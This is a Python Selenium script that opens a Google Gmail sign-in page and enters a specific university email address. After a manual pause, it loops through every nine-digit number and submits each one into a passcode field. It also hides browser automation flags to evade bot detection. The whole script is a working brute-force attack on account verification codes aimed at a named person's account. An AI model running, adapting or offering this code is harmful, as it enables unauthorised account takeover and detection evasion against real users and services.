from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
from selenium.webdriver import ChromeOptions

# Initialize the browser

option=ChromeOptions()
option.add_experimental_option('excludeSwitches',['enable-automation'])
option.add_experimental_option('useAutomationExtension',False)
driver = webdriver.Chrome(options = option)
driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument',
                       {'source':'Object.defineProperty(navigator,"webdriver",{get:()=>undefined})'})
# Open the target webpage
driver.get("https://accounts.google.com/v3/signin/identifier?authuser=0&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ec=GAlAFw&hl=en&service=mail&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S-450539637%3A1731562896728071&ddm=1")  # Replace with the URL you want to access
time.sleep(2)
# Locate the input field
input_box = driver.find_element(By.XPATH, "//*[@id='identifierId']")  # Replace with actual input field ID or other selector
input_box.send_keys('tyt16888@umd.edu')
input_box.send_keys(Keys.RETURN)
a = input('按下任意键继续')

time.sleep(1)
input_box = driver.find_element(By.ID, "passcode-input")
for i in range(100000000,999999999):
# Enter text into the input box
    input_box.send_keys(str(i))

    # Submit the form
    input_box.send_keys(Keys.RETURN)  # Press Enter if the form submits on Enter
    print(i)
    time.sleep(1.5)
    driver.execute_script("document.elementFromPoint(100, 100).click();")
    time.sleep(0.5)
    input_box = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "passcode-input")))

